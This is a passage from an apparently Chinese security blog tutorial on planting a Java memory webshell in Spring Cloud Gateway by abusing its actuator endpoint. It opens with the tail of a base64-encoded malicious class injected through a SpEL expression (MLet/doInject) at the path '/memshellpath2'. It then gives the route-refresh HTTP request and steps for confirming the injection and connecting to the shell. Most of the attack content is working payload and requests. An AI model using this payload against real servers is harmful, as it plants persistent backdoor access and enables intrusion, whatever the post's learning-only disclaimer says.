UACABGABUARwA3AE8AOgBIADsASgBBAEsARwBMAGsATgBuAE0AcABQAG0AAABIAAcAFQAiAJcAewADAAgAMgCYAJkAAQBHACQAlwB7AAQAQQAtAJgAmQABADsANQB4AHkAAwAAAHIAmgCEAAAAAgBwAJsAZgACAH0AAAAqAAP/ADoAAwcAJQAHAH8AAQcAfv8AMwAEBwAlAAcAfwcAfgABBwB++gABAIgAAAAEAAEAGwCAAAAABQEAmgAAAAkAnACdAAMAawAAAUoABgAFAAAAeAFNEji4ADlMKxJAAbYAOysBtgAZTi22AAoSQQS9AAxZAxIVU7YAOy0EvQANWQMqU7YAGcAAJcAAJU2nADxOEkK4ADlMK7YAPjoEGQS2AAoSQwS9AAxZAxIVU7YAOxkEBL0ADVkDKlO2ABnAACXAACVNpwAFOgQssAACAAIAOgA9ABsAPgBxAHQAGwADAGwAAAAyAAwAAABVAAIAVwAIAFgAFQBZADoAYQA9AFoAPgBcAEQAXQBKAF4AcQBgAHQAXwB2AGIAbQAAAEgABwAVACUAngB7AAMACAA1AJgAmQABAEoAJwCeAHsABABEADAAmACZAAEAPgA4AHgAeQADAAAAeACaAGYAAAACAHYAmwCEAAIAfQAAACoAA/8APQADBwB/AAcAJQABBwB+/wA2AAQHAH8ABwAlBwB+AAEHAH76AAEAiAAAAAQAAQAbAIAAAAAFAQCaAAAAIQCfAKAAAwBrAAAAlAAEAAMAAAAsK7kARAEAKroARQAAtgBGTbsAR1kssgBItwBJsE27AEdZLLYASrIASLcASbAAAQAAABsAHAAbAAMAbAAAABIABAAAAGkAEACAABwAgQAdAIIAbQAAACoABAAQAAwAoQB7AAIAHQAPAKIAeQACAAAALABuAG8AAAAAACwAowCkAAEAfQAAAAYAAVwHAH4AgAAAAAUBAKMAAAClAAAADgABAKYAAQCbWwABcwCnEAIAqACpAAIAawAAAZgABAAHAAAAwLsAAlm3AANNK7IABLkASwIAwAAVTiotuABMA7YATToEsgBOEk+5AFACAMcAFrIAThJPGQS4AFG5AFIDAFenAG6yAE4SUxkEuQBSAwBXuwBUWbcAVToFsgBOEk+5AFACAMAADLYAPjoGGQYZBbYAVlcZBhkEtgBWVyyyAAkDEBC2AFe2AAVXGQa2AFhXLCoZBbYAWQS2AE24AFq2AAVXLLIACRAQtgBbtgAFV6cADU4sLbYASrYABVcstgAHuABcsAABAAgAqwCuABsAAwBsAAAASgASAAAAagAIAGwAFQBtACAAbgAtAG8AQABxAE0AcgBWAHMAaAB0AHAAdQB4AHYAhgB3AIwAeACeAHkAqwB9AK4AewCvAHwAuAB+AG0AAABSAAgAVgBVAKoAqwAFAGgAQwCsAHsABgAVAJYArQBmAAMAIACLAK4AhAAEAK8ACQCiAHkAAwAAAMAAbgBvAAAAAADAAIsArwABAAgAuACwALEAAgB9AAAAFgAE/gBABwCyBwB/BwAl+QBqQgcAfgkAgAAAAAUBAIsQAAAIALMAagABAGsAAAAxAAIAAAAAABW7AF1ZtwBeswBOEl+zAAQSYLMABrEAAAABAGwAAAAKAAIAAAAPAAoAEAADALQAAAACALUBJwAAABIAAgDJAA8BJgYJAXIBdQFzABkA+QAAAAwAAQD6AAMA+wD8AP0='),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'/memshellpath2')}",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "https://www.uri-destination.org",
  "order": 0
}


```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfonJXq9lHHWkwrPzChybmRU7ics4IkBse6z8CeX7T4IjQ6iaMZHNnACHwQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
/memshellpath2就是我们内存马的路径
刷新路由  
```
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 6


```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoUVJT04mIuX0JJVs6jT8fg3ygIhEJ1UsAU7MfL6kP5m2EP7zIP2zpIQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
此时我们可以查看mappings端点来搜索内存马的路由来判断是否插入成功![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoCsC0PibqzB0vzvqhLr97CCp8FqiatSysbibsDnYZKVB5qs4fZ0CwHg30g/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
可以看到写入成功，接下来我们可以直接进行连接。![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfo4osqnqicUZUhZFLr0OliaibV3hVa4qQM4rC4wxTPnMzLXjWq0t9e7LleQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
## 0x04参考链接  
  
https://mp.weixin.qq.com/s/pRwLkFSlVcev7srsMPRuqQ  
  
https://blog.csdn.net/pyth0zn/article/details/130234277  
  
> **文章来源：TIDE安全团队**  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
